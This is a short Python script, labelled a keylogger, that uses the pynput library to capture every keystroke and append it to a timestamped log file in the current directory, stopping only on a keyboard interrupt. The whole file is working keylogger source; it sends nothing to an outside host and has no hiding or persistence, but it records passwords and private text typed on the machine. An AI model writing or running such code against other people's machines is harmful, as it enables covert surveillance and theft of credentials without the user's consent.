import os
from datetime import datetime
from pynput import keyboard

# Create a log file to store key strokes
log_file = os.path.join(os.getcwd(), f"keylog_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.log")

def onPress(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)   # Store normal keys in readable form
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")     # Store special characters

try:
    with keyboard.Listener(on_press=onPress) as listener : 
        listener.join()
except KeyboardInterrupt:
    print("\n[Keylogger stopped by user]")